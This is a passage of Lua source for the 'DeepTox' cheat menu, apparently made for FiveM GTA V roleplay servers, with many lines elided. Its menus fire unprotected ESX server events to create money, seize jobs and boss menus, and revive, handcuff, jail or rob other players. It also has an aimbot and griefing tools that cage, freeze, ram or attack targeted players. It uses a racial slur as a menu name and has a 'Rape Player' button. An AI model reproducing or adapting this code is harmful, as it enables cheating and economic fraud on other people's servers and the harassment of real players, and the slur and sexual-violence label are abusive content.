                    bc = false; oldprim, oldsec = GetVehicleColours(veh) oldpearl, oldwheelcolour = GetVehicleExtraColours(veh) b9 = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour) SetVehicleExtraColours(veh, dT.id, oldwheelcolour) SetVehicleColours(veh, dT.id, oldsec) b8 = true elseif b8 and curprim == dT.id then SetVehicleColours(veh, dT.id, oldsec) SetVehicleExtraColours(veh, dT.id, oldwheelcolour) b8 = false; ba = -1; b9 = -1 elseif b8 and curprim ~= dT.id then SetVehicleColours(veh, dT.id, oldsec) SetVehicleExtraColours(veh, dT.id, oldwheelcolour) b8 = true end end end; DeepTox.Display() elseif DeepTox.IsMenuOpened("classic2") then
                    ...
                    if not b8 then ba = "paint"
                    bc = false; oldprim, oldsec = GetVehicleColours(veh) b9 = table.pack(oldprim, oldsec) SetVehicleColours(veh, oldprim, dT.id) b8 = true elseif b8 and cursec == dT.id then SetVehicleColours(veh, oldprim, dT.id) b8 = false; ba = -1; b9 = -1 elseif b8 and cursec ~= dT.id then SetVehicleColours(veh, oldprim, dT.id) b8 = true end end end; DeepTox.Display() elseif DeepTox.IsMenuOpened("matte2") then
                    ...
                    if not b8 then ba = "paint"
                    bc = false; oldprim, oldsec = GetVehicleColours(veh) b9 = table.pack(oldprim, oldsec) SetVehicleColours(veh, oldprim, dT.id) b8 = true elseif b8 and cursec == dT.id then SetVehicleColours(veh, oldprim, dT.id) b8 = false; ba = -1; b9 = -1 elseif b8 and cursec ~= dT.id then SetVehicleColours(veh, oldprim, dT.id) b8 = true end end end; DeepTox.Display() elseif DeepTox.IsMenuOpened("metal2") then
                    ...
                    if not b8 then ba = "paint"
                    bc = false; oldprim, oldsec = GetVehicleColours(veh) oldpearl, oldwheelcolour = GetVehicleExtraColours(veh) b9 = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour) SetVehicleExtraColours(veh, oldpearl, dT.id) b8 = true elseif b8 and currims == dT.id then SetVehicleExtraColours(veh, oldpearl, dT.id) b8 = false; ba = -1; b9 = -1 elseif b8 and currims ~= dT.id then SetVehicleExtraColours(veh, oldpearl, dT.id) b8 = true end end end; DeepTox.Display() elseif DeepTox.IsMenuOpened("matte3") then
                    ...
                    if not b8 then ba = "paint"
                    bc = false; oldprim, oldsec = GetVehicleColours(veh) oldpearl, oldwheelcolour = GetVehicleExtraColours(veh) b9 = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour) SetVehicleExtraColours(veh, oldpearl, dT.id) b8 = true elseif b8 and currims == dT.id then SetVehicleExtraColours(veh, oldpearl, dT.id) b8 = false; ba = -1; b9 = -1 elseif b8 and currims ~= dT.id then SetVehicleExtraColours(veh, oldpearl, dT.id) b8 = true end end end; DeepTox.Display() elseif DeepTox.IsMenuOpened("metal3") then
                    ...
                    DeepTox.Display()
                elseif DeepTox.IsMenuOpened("SpawnPedsMenu") then
                    if DeepTox.Button("Mountain Lion") then
                    ...
                    elseif DeepTox.Button("Alien With Ak") then
                    ...
                    DeepTox.Display()
                elseif DeepTox.IsMenuOpened("TeleportMenu") then
                    if DeepTox.Button("Teleport To Waypoint") then
                        TeleportToWaypoint()
                    elseif DeepTox.Button("Teleport Into Nearest Vehicle") then
                        teleportToNearestVehicle()
                    elseif DeepTox.Button("Teleport To Coords") then
                        TeleportToCoords()
                    elseif DeepTox.CheckBox(
                        "Show Coords",
                        showCoords,
                        function(enabled)
                            showCoords = enabled
                    ...
                    then
                    elseif DeepTox.Button("Draw Custom Blip") then
                        bk()
                    end

                    DeepTox.Display()
                elseif DeepTox.IsMenuOpened("VehMenu") then
                    if DeepTox.Button("Repair Vehicle") then
                        SetVehicleFixed(GetVehiclePedIsIn(GetPlayerPed(-1), false))
                        SetVehicleDirtLevel(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0.0)
                        SetVehicleLights(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
                        SetVehicleBurnout(GetVehiclePedIsIn(GetPlayerPed(-1), false), false)
                        Citizen.InvokeNative(0x1FD09E7390A74D54, GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
                    elseif DeepTox.Button("Spawn Custom Vehicle") then
                    ...
                    elseif DeepTox.MenuButton("Vehicle Spawner", "CarTypes") then
                    elseif DeepTox.MenuButton("Spawn options", "VehSpawnOpt") then
                    elseif DeepTox.MenuButton("LC Customs", "NiggerCustoms") then
                    elseif DeepTox.Button("Delete Vehicle") then
                        DelVeh(GetVehiclePedIsUsing(PlayerPedId()))
                    elseif DeepTox.Button("Delete Closest Vehicle") then
                        local PlayerCoords = GetEntityCoords(PlayerPedId())
                        DelVeh(GetClosestVehicle(PlayerCoords.x, PlayerCoords.y, PlayerCoords.z, 1000.0, 0, 4))
                    end

                    DeepTox.Display()
                elseif DeepTox.IsMenuOpened("CarTypes") then
                    for i, e3 in ipairs(aX) do
                        if DeepTox.MenuButton(" "..e3, "CarTypeSelection") then
                            carTypeIdx = i
                        end
                    end

                    DeepTox.Display()
                elseif DeepTox.IsMenuOpened("CarTypeSelection") then
                    for i, e3 in ipairs(aY[carTypeIdx]) do
                        if DeepTox.MenuButton(" "..e3, "CarOptions") then
                            carToSpawn = i
                        end
                    end

                    DeepTox.Display()
                elseif DeepTox.IsMenuOpened("CarOptions") then
                    if DeepTox.Button("Spawn Car") then
                    ...
                    DeepTox.Display()
                elseif DeepTox.IsMenuOpened("NiggerCustoms") then
                    if DeepTox.CheckBox(
                        "Super Handling",
                        superGrip,
                        function(enabled)
                    ...
                    then
                    elseif DeepTox.MenuButton("Torque Boost", "VehBoostMenu") then
                    elseif DeepTox.MenuButton("Performance Tuning", "performance") then
                    elseif DeepTox.MenuButton("Exterior Tuning", "tunings") then
                    elseif DeepTox.Button("Max Tuning") then
                        MaxOut(GetVehiclePedIsUsing(PlayerPedId()))
                    elseif DeepTox.Button("Max Performance") then
                        MaxOutPerf(GetVehiclePedIsUsing(PlayerPedId()))
                    end

                    DeepTox.Display()
                elseif DeepTox.IsMenuOpened("VehBoostMenu") then
                    if DeepTox.CheckBox(
                        "Torque Boost 2x",
                        t2x,
                        function(enabled)
                    ...
                    DeepTox.Display()
                elseif DeepTox.IsMenuOpened("PerformanceMenu") then

                    DeepTox.Display()
                elseif DeepTox.IsMenuOpened("VehSpawnOpt") then
                    if DeepTox.CheckBox(
                    ...
                    DeepTox.Display()
                elseif DeepTox.IsMenuOpened("MaliciousMenu") then
                    if DeepTox.CheckBox(
                        "Crosshair",
                        crosshair,
                        function(enabled)
                    ...
                    then
                    elseif DeepTox.CheckBox("Name Above Head", nameAboveHead, function(enabled) nameAboveHead = enabled end) then
                    elseif DeepTox.CheckBox('~o~Thermal Vision', thermalVision, function(enabled) thermalVision = enabled SetSeethrough(thermalVision) end) then
                    elseif DeepTox.CheckBox(
                        "AimBot",
                        aimbot,
                        function(enabled)
                    ...
                    DeepTox.Display()
                elseif DeepTox.IsMenuOpened("ESXMenu") then
                    if DeepTox.MenuButton("ESX Money Options", "ESXMoneyMenu") then
                    elseif DeepTox.MenuButton("ESX Job Menu", "ESXJobMenu") then
                    elseif DeepTox.MenuButton("ESX Boss", "ESXBossMenu") then
                    elseif DeepTox.MenuButton("ESX Drugs", "ESXDrugMenu") then
                    elseif DeepTox.MenuButton("ESX Misc", "ESXMiscMenu") then
                    end

                    DeepTox.Display()
                elseif DeepTox.IsMenuOpened("ESXMiscMenu") then
                    if DeepTox.Button("ESX Harvest FixKit") then
                        TriggerServerEvent('esx_mechanicjob:startHarvest')
                    elseif DeepTox.Button("ESX Craft FixKit") then
                        TriggerServerEvent('esx_mechanicjob:startCraft')
                    elseif DeepTox.Button("ESX Revive Id") then
                        local id = KeyboardInput("Enter Id", "", 100)
                        TriggerServerEvent("esx_ambulancejob:revive", id)
                    end

                    DeepTox.Display()
                elseif DeepTox.IsMenuOpened("ESXDrugMenu") then
                    if DeepTox.Button('Harvest Weed (x5)') then
                        TriggerServerEvent('esx_drugs:startHarvestWeed')
                        TriggerServerEvent('esx_drugs:startHarvestWeed')
                        TriggerServerEvent('esx_drugs:startHarvestWeed')
                        TriggerServerEvent('esx_drugs:startHarvestWeed')
                        TriggerServerEvent('esx_drugs:startHarvestWeed')
                    elseif DeepTox.Button('Transform Weed (x5)') then
                        TriggerServerEvent('esx_drugs:startTransformWeed')
                        TriggerServerEvent('esx_drugs:startTransformWeed')
                        TriggerServerEvent('esx_drugs:startTransformWeed')
                        TriggerServerEvent('esx_drugs:startTransformWeed')
                        TriggerServerEvent('esx_drugs:startTransformWeed')
                    elseif DeepTox.Button('Sell Weed (x5)') then
                        TriggerServerEvent('esx_drugs:startSellWeed')
                        TriggerServerEvent('esx_drugs:startSellWeed')
                        TriggerServerEvent('esx_drugs:startSellWeed')
                        TriggerServerEvent('esx_drugs:startSellWeed')
                        TriggerServerEvent('esx_drugs:startSellWeed')
                    elseif DeepTox.Button('Harvest Coke (x5)') then
                        TriggerServerEvent('esx_drugs:startHarvestCoke')
                        TriggerServerEvent('esx_drugs:startHarvestCoke')
                        TriggerServerEvent('esx_drugs:startHarvestCoke')
                        TriggerServerEvent('esx_drugs:startHarvestCoke')
                        TriggerServerEvent('esx_drugs:startHarvestCoke')
                    elseif DeepTox.Button('Transform Coke (x5)') then
                        TriggerServerEvent('esx_drugs:startTransformCoke')
                        TriggerServerEvent('esx_drugs:startTransformCoke')
                        TriggerServerEvent('esx_drugs:startTransformCoke')
                        TriggerServerEvent('esx_drugs:startTransformCoke')
                        TriggerServerEvent('esx_drugs:startTransformCoke')
                    elseif DeepTox.Button('Sell Coke (x5)') then
                        TriggerServerEvent('esx_drugs:startSellCoke')
                        TriggerServerEvent('esx_drugs:startSellCoke')
                        TriggerServerEvent('esx_drugs:startSellCoke')
                        TriggerServerEvent('esx_drugs:startSellCoke')
                        TriggerServerEvent('esx_drugs:startSellCoke')
                    elseif DeepTox.Button('Harvest Meth (x5)') then
                        TriggerServerEvent('esx_drugs:startHarvestMeth')
                        TriggerServerEvent('esx_drugs:startHarvestMeth')
                        TriggerServerEvent('esx_drugs:startHarvestMeth')
                        TriggerServerEvent('esx_drugs:startHarvestMeth')
                        TriggerServerEvent('esx_drugs:startHarvestMeth')
                    elseif DeepTox.Button('Transform Meth (x5)') then
                        TriggerServerEvent('esx_drugs:startTransformMeth')
                        TriggerServerEvent('esx_drugs:startTransformMeth')
                        TriggerServerEvent('esx_drugs:startTransformMeth')
                        TriggerServerEvent('esx_drugs:startTransformMeth')
                        TriggerServerEvent('esx_drugs:startTransformMeth')
                    elseif DeepTox.Button('Sell Meth (x5)') then
                        TriggerServerEvent('esx_drugs:startSellMeth')
                        TriggerServerEvent('esx_drugs:startSellMeth')
                        TriggerServerEvent('esx_drugs:startSellMeth')
                        TriggerServerEvent('esx_drugs:startSellMeth')
                        TriggerServerEvent('esx_drugs:startSellMeth')
                    elseif DeepTox.Button('Harvest Opium (x5)') then
                        TriggerServerEvent('esx_drugs:startHarvestOpium')
                        TriggerServerEvent('esx_drugs:startHarvestOpium')
                        TriggerServerEvent('esx_drugs:startHarvestOpium')
                        TriggerServerEvent('esx_drugs:startHarvestOpium')
                        TriggerServerEvent('esx_drugs:startHarvestOpium')
                    elseif DeepTox.Button('Transform Opium (x5)') then
                        TriggerServerEvent('esx_drugs:startTransformOpium')
                        TriggerServerEvent('esx_drugs:startTransformOpium')
                        TriggerServerEvent('esx_drugs:startTransformOpium')
                        TriggerServerEvent('esx_drugs:startTransformOpium')
                        TriggerServerEvent('esx_drugs:startTransformOpium')
                    elseif DeepTox.Button('Sell Opium (x5)') then
                        TriggerServerEvent('esx_drugs:startSellOpium')
                        TriggerServerEvent('esx_drugs:startSellOpium')
                        TriggerServerEvent('esx_drugs:startSellOpium')
                        TriggerServerEvent ('esx_drugs:startSellOpium')
                        TriggerServerEvent('esx_drugs:startSellOpium')
                    elseif DeepTox.Button('Money Wash (x10)') then
                        ...
                        TriggerServerEvent('esx_blanchisseur:startWhitening', 1)
                        TriggerServerEvent('esx_blanchisseur:startWhitening', 1)
                    elseif DeepTox.Button('Stop all (Drugs)') then
                    ...
                    DeepTox.Display()
                elseif DeepTox.IsMenuOpened("ESXBossMenu") then
                    if DeepTox.Button("ESX Mechanic Boss Menu") then
                        ...
                        DeepTox.CloseMenu()
                    elseif DeepTox.Button("ESX Police Boss Menu") then
                        ...
                        DeepTox.CloseMenu()
                    elseif DeepTox.Button("ESX Ambulance Boss Menu") then
                        ...
                        TriggerEvent("esx_society:openBossMenu","ambulance",function(dY,dZ)
                            ...
                            DeepTox.CloseMenu()
                    elseif DeepTox.Button("ESX Taxi Boss Menu") then
                        ...
                        TriggerEvent("esx_society:openBossMenu","taxi",function(dY,dZ)
                            ...
                            DeepTox.CloseMenu()
                    elseif DeepTox.Button("ESX Real Estate Boss Menu") then
                        ...
                        TriggerEvent("esx_society:openBossMenu","realestateagent",function(dY,dZ)
                            ...
                            DeepTox.CloseMenu()
                    elseif DeepTox.Button("ESX Car Dealer Boss Menu") then
                        ...
                        TriggerEvent("esx_society:openBossMenu","cardealer",function(dY,dZ)
                            ...
                            DeepTox.CloseMenu()
                    elseif DeepTox.Button("ESX Custom Boss Menu") then
                    ...
                    DeepTox.Display()
                elseif DeepTox.IsMenuOpened("ESXJobMenu") then
                    if DeepTox.Button("Unemployed") then
                        TriggerServerEvent('NB:destituerplayer',GetPlayerServerId(-1))
                    elseif DeepTox.Button("Police") then
                        TriggerServerEvent('NB:recruterplayer',GetPlayerServerId(-1),"police",3)
                    elseif DeepTox.Button("Mechanic") then
                        TriggerServerEvent('NB:recruterplayer',GetPlayerServerId(-1),"mecano",3)
                    elseif DeepTox.Button("Taxi") then
                        TriggerServerEvent('NB:recruterplayer',GetPlayerServerId(-1),"taxi",3)
                    elseif DeepTox.Button("Ambulance") then
                        TriggerServerEvent('NB:recruterplayer',GetPlayerServerId(-1),"ambulance",3)
                    elseif DeepTox.Button("Real Estate Agent") then
                        TriggerServerEvent('NB:recruterplayer',GetPlayerServerId(-1),"realestateagent",3)
                    elseif DeepTox.Button("Car Dealer") then
                        TriggerServerEvent('NB:recruterplayer',GetPlayerServerId(-1),"cardealer",3)
                    end

                    DeepTox.Display()
                elseif DeepTox.IsMenuOpened("ESXMoneyMenu") then
                    if DeepTox.Button("ESX TruckerJob") then
                        local result = KeyboardInput("Enter amount of money", "", 100000000)
                        if result ~= "" then
                            TriggerServerEvent('esx_truckerjob:pay', result)
                        end
                    elseif DeepTox.Button("ESX Caution Give Back") then
                        local result = KeyboardInput("Enter amount of money", "", 100000000)
                        if result ~= "" then
                            TriggerServerEvent('esx_jobs:caution', 'give_back', result)
                        end
                    elseif DeepTox.Button("ESX Eden Garage") then
                        local result = KeyboardInput("Enter amount of money", "", 100000000)
                        if result ~= "" then
                            TriggerServerEvent("eden_garage:payhealth", {costs = -result})
                        end
                    elseif DeepTox.Button("ESX GoPostalJob") then
                        local result = KeyboardInput("Enter amount of money", "", 100000000)
                        if result ~= "" then
                            TriggerServerEvent("esx_gopostaljob:pay", result)
                        end
                    elseif DeepTox.Button("ESX BankerJob") then
                        local result = KeyboardInput("Enter amount of money", "", 100000000)
                        if result ~= "" then
                            TriggerServerEvent("esx_banksecurity:pay", result)
                        end
                    elseif DeepTox.Button("ESX Fuel Delivery") then
                        local result = KeyboardInput("Enter amount of money", "", 100000000)
                        if result ~= "" then
                            TriggerServerEvent("esx_fueldelivery:pay", result)
                        end
                    elseif DeepTox.Button("ESX Car Thief") then
                        local result = KeyboardInput("Enter amount of money", "", 100000000)
                        if result ~= "" then
                            TriggerServerEvent("esx_carthief:pay", result)
                        end
                    elseif DeepTox.Button("ESX DMV School") then
                        local result = KeyboardInput("Enter amount of money", "", 100000000)
                        if result ~= "" then
                            TriggerServerEvent("esx_dmvschool:pay", {costs = -result})
                        end
                    elseif DeepTox.Button("ESX Legacy Fuel") then
                        local result = KeyboardInput("Enter amount of money", "", 100000000)
                        if result ~= "" then
                            TriggerServerEvent("LegacyFuel:PayFuel", {costs = -result})
                        end
                    elseif DeepTox.Button("ESX Dirty Job") then
                        local result = KeyboardInput("Enter amount of money", "", 100000000)
                        if result ~= "" then
                            TriggerServerEvent("esx_godirtyjob:pay", result)
                        end
                    elseif DeepTox.Button("ESX Pizza Boy") then
                        local result = KeyboardInput("Enter amount of money", "", 100000000)
                        if result ~= "" then
                            TriggerServerEvent("esx_pizza:pay", result)
                        end
                    elseif DeepTox.Button("ESX Ranger") then
                        local result = KeyboardInput("Enter amount of money", "", 100000000)
                        if result ~= "" then
                            TriggerServerEvent("esx_ranger:pay", result)
                        end
                    elseif DeepTox.Button("ESX Garage Job") then
                        local result = KeyboardInput("Enter amount of money", "", 100000000)
                        if result ~= "" then
                            TriggerServerEvent("esx_garbagejob:pay", result)
                        end
                    elseif DeepTox.Button("ESX Car Thief Dirty Money") then
                        local result = KeyboardInput("Enter amount of money", "", 100000000)
                        if result ~= "" then
                            TriggerServerEvent("esx_carthief:pay", result)
                        end
                    elseif DeepTox.Button("ESX Admin Menu Give Bank") then
                        local result = KeyboardInput("Enter amount of money", "", 100000000)
                        if result ~= "" then
                            TriggerServerEvent("AdminMenu:giveBank", result)
                        end
                    elseif DeepTox.Button("ESX Admin Menu Give Cash") then
                        local result = KeyboardInput("Enter amount of money", "", 100000000)
                        if result ~= "" then
                            TriggerServerEvent("AdminMenu:giveCash", result)
                        end
                    elseif DeepTox.Button("ESX Slot Machine") then
                        local result = KeyboardInput("Enter amount of money", "", 100000000)
                        if result ~= "" then
                            TriggerServerEvent("esx_slotmachine:sv:2", result)
                        end
                    elseif DeepTox.CheckBox("ESX Hunting reward", huntspam, function(enabled) huntspam = enabled end) then
                    end

                    DeepTox.Display()
                elseif DeepTox.IsMenuOpened("SelfMenu") then
                    if DeepTox.Button("Revive (ESX)") then
                        print('hello')
                    elseif DeepTox.Button("Heal (NATIVE)") then
                        SetEntityHealth(PlayerPedId(), 200)
                    elseif DeepTox.Button("Give Armor (NATIVE)") then
                        SetPedArmour(PlayerPedId(), 200)
                    elseif DeepTox.Button("Hunger & Thirst 100% (ESX)") then
                        TriggerEvent('esx_status:set', 'hunger', 1000000)
                        TriggerEvent('esx_status:set', 'thirst', 1000000)
                    elseif DeepTox.Button("Suicide (NATIVE)") then
                    ...
                    DeepTox.Display()
                elseif DeepTox.IsMenuOpened("OnlinePlayersMenu") then
                        for i = 0, 128 do
                            if NetworkIsPlayerActive(i) and GetPlayerServerId(i) ~= 0 and DeepTox.MenuButton(GetPlayerName(i).." ID = ["..GetPlayerServerId(i).."] i = ["..i.."] "..(IsPedDeadOrDying(GetPlayerPed(i), 1) and "~r~DEAD" or "~g~ALIVE"), "PlayerOptionsMenu") then
                                SelectedPlayer = i
                            end
                        end

                        DeepTox.Display()
                    elseif DeepTox.IsMenuOpened("PlayerOptionsMenu") then
                        DeepTox.SetSubTitle("PlayerOptionsMenu", "Player Options ["..GetPlayerName(SelectedPlayer).."]")
                        if DeepTox.Button('Spectate', (Spectating and "~g~[SPECTATING]")) then
                            SpectatePlayer(SelectedPlayer)
                        elseif DeepTox.Button('Teleport To') then
                            local Entity = IsPedInAnyVehicle(PlayerPedId(), false) and GetVehiclePedIsUsing(PlayerPedId()) or PlayerPedId()
                            SetEntityCoords(Entity, GetEntityCoords(GetPlayerPed(SelectedPlayer)), 0.0, 0.0, 0.0, false)
                        elseif DeepTox.Button("Heal Player (NATIVE)") then
                        ...
                        elseif DeepTox.MenuButton("Give Single Weapon", "SingleWepPlayer") then
                        elseif DeepTox.Button("Give Ammo") then
                            for i = 1, #allWeapons do
                                AddAmmoToPed(GetPlayerPed(SelectedPlayer), GetHashKey(allWeapons[i]), 250)
                            end
                        elseif DeepTox.Button("Give All Weapons") then
                            for i = 1, #allWeapons do
                                GiveWeaponToPed(GetPlayerPed(SelectedPlayer), GetHashKey(allWeapons[i]), 1000, false, false)
                            end
                        elseif DeepTox.Button("Remove All Weapons") then
                            for i = 1, #allWeapons do
                                RemoveAllPedWeapons(GetPlayerPed(SelectedPlayer), true)
                            end
                        elseif DeepTox.Button("Give Vehicle") then
                        ...
                        elseif DeepTox.Button("Kick From Vehicle") then
                            ClearPedTasksImmediately(GetPlayerPed(SelectedPlayer))
                        elseif DeepTox.Button("Delete Vehicle") then
                        ...
                        DeepTox.Display()
                    elseif DeepTox.IsMenuOpened("PlayerESXMenu") then
                        if DeepTox.MenuButton("ESX Triggers", "PlayerESXTriggerMenu") then
                        elseif DeepTox.MenuButton("ESX Jobs", "PlayerESXJobMenu") then
                        end

                        DeepTox.Display()
                    elseif DeepTox.IsMenuOpened("PlayerESXTriggerMenu") then
                        if DeepTox.Button("ESX Revive") then
                            TriggerServerEvent("esx_ambulancejob:revive",GetPlayerServerId(selectedPlayer))
                        elseif DeepTox.Button("ESX Give Money To Player From Your Wallet") then
                        ...
                        elseif DeepTox.Button("ESX Steal Money From Player") then
                        ...
                        elseif DeepTox.Button("ESX Handcuff Player") then
                            TriggerServerEvent("esx_policejob:handcuff",GetPlayerServerId(selectedPlayer))
                        elseif DeepTox.Button("ESX Send To Jail") then
                        ...
                        elseif DeepTox.Button("ESX Get Out Of Jail") then
                        ...
                        DeepTox.Display()
                    elseif DeepTox.IsMenuOpened("PlayerESXJobMenu") then
                        if DeepTox.Button("Unemployed") then
                        ...
                        DeepTox.Display()
                    elseif DeepTox.IsMenuOpened("PlayerTrollMenu") then
                        if DeepTox.Button ("Fake Chat Message") then
                        ...
                        elseif DeepTox.Button("Cage Player") then
                            freezePlayer = true
                            Citizen.Wait(50)
                            SpawnObjOnPlayer(GetHashKey("prop_gascage01"))
                            Citizen.Wait(50)
                            freezePlayer = false
                        elseif DeepTox.Button("Rape Player") then
                            rape(SelectedPlayer)
                        elseif DeepTox.Button("Mellotrainer Ban") then
                        ...
                        elseif DeepTox.Button("Mellotrainer Kick") then
                        ...
                        elseif DeepTox.MenuButton("Ram Vehicles Into Player", "VehicleRamMenu") then
                        elseif DeepTox.MenuButton("Spawn Peds", "PlayerSpawnPedsMenu") then
                        elseif DeepTox.MenuButton("Spawn Props On Player", "SpawnPropsMenu") then
                        elseif DeepTox.CheckBox(
                            "Freeze Player",
                            freezePlayer,
                            function(enabled)
                    ...
                    elseif DeepTox.IsMenuOpened("SpawnPropsMenu") then
                        ...
                        then
                        elseif DeepTox.ComboBox("Bone", { "Head", "Right Hand" }, currentBone, selectedBone, function(currentIndex, selectedIndex)
                            currentBone = currentIndex
                            selectedBone = selectedIndex
                        end)
                        then
                        elseif DeepTox.Button("Weed") then
                            local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), true)
                        ...
                        elseif DeepTox.Button("UFO") then
                            local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), true)
                        ...
                        elseif DeepTox.Button("Windmill") then
                            local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), true)
                        ...
                        elseif DeepTox.Button("Custom Prop") then
                            local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), true)
                        ...
                        DeepTox.Display()
                    elseif DeepTox.IsMenuOpened("PlayerSpawnPedsMenu") then
                            if DeepTox.Button("Spawn ~s~Swat army with AK") then
                            ...
                            elseif DeepTox.Button("Spawn ~s~Swat army with RPG") then
                                local eU = "s_m_y_swat_01"
                                local eS = "weapon_rpg"
                                for i = 0, 10 do
                                    local cM = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                            ...
                            elseif DeepTox.Button("Spawn ~s~Swat army with Flaregun") then
                                local eU = "s_m_y_swat_01"
                            ...
                            elseif DeepTox.Button("Spawn ~s~Swat army with Railgun") then
                                local eU = "s_m_y_swat_01"
                        ...
                        DeepTox.Display()
                elseif DeepTox.IsMenuOpened("VehicleRamMenu") then
                    if DeepTox.Button("Futo") then
                    ...
                    elseif DeepTox.Button("Bus") then
                        ...
                        DeepTox.Display()
                elseif DeepTox.IsMenuOpened("SingleWepPlayer") then
                    for i = 1, #allWeapons do
                        if DeepTox.Button(allWeapons[i]) then
                    ...
                    DeepTox.Display()
                elseif DeepTox.IsMenuOpened("WeaponMenu") then
                    if DeepTox.MenuButton("Weapon List", "WeaponTypes") then
                    elseif DeepTox.ComboBox("Weapon/Melee Damage", { "1x (Default)", "2x", "3x", "4x", "5x" }, currentDamage, selectedDamage, function(currentIndex, selectedIndex)
                    ...
                    elseif DeepTox.Button("Drop Current Weapon") then
                        local ped = GetPlayerPed(-1)
                    ...
                    then
                    elseif DeepTox.MenuButton("Weapon Tints", "WeaponCustomization") then
                    elseif DeepTox.MenuButton("Bullet Gun Options", "BulletGunMenu") then
                    end

                    DeepTox.Display()
                elseif DeepTox.IsMenuOpened("WeaponCustomization") then
                    if DeepTox.CheckBox(
                        "Rainbow Tint",
                        rainbowTint,
                        function(enabled)
                    ...
                    then
                    elseif DeepTox.ComboBox("Weapon Tints", { "Normal", "Green", "Gold", "Pink", "Army", "LSPD", "Orange", "Platinum" }, currentTint, selectedTint, function(currentIndex, selectedIndex)
                    ...
                    then
                    elseif DeepTox.Button("Add Special Finish") then
                    ...
                    elseif DeepTox.Button("Remove Special Finish") then
                    ...
                    DeepTox.Display()
                elseif DeepTox.IsMenuOpened("BulletGunMenu") then
                    if DeepTox.CheckBox(
                        "Vehicle Gun",
                        vehicleGun,
                        function(enabled)
                    ...
                    then
                    elseif DeepTox.ComboBox("Vehicle To Shoot", vehicles, currentVehicle, selectedVehicle, function(currentIndex, selectedIndex)
                        currentVehicle = currentIndex
                        selectedVehicle = selectedIndex

                    end)
                    then
                    elseif DeepTox.ComboBox("Vehicle Speed", vehicleSpeed, currentVehicleSpeed, selectedVehicleSpeed, function(currentIndex, selectedIndex)
                    ...
                    then
                    elseif DeepTox.ComboBox("Ped To Shoot", peds, currentPed, selectedPed, function(currentIndex, selectedIndex)
                    ...
                    then
                    elseif DeepTox.ComboBox("Bullet", bullets, currentBullet, selectedBullet, function(currentIndex, selectedIndex)
